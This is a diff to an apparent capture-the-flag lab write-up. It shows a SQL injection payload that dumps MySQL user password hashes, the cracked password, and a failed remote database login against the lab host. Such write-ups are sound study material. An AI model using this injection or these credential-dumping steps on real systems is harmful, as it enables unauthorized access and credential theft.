@@ -51,4 +51,12 @@ term=1'union slect user,password,3 from mysql.user--
 hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
 ```
 
-SHA-1 hash decodes to `Welkom1!`
+SHA-1 hash decodes to `Welkom1!`. This could be either admin or gio's password. Connections aren't permitted to the MySQL service from an external IP. Localhost only:
+```bash
+➜  loot git:(main) ✗ mysql -u 'gio' -p 'Welkom1!' -h 10.10.10.154
+mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
+Enter password: 
+
+ERROR 1130 (HY000): Host '10.10.14.2' is not allowed to connect to this MariaDB server
+```
+
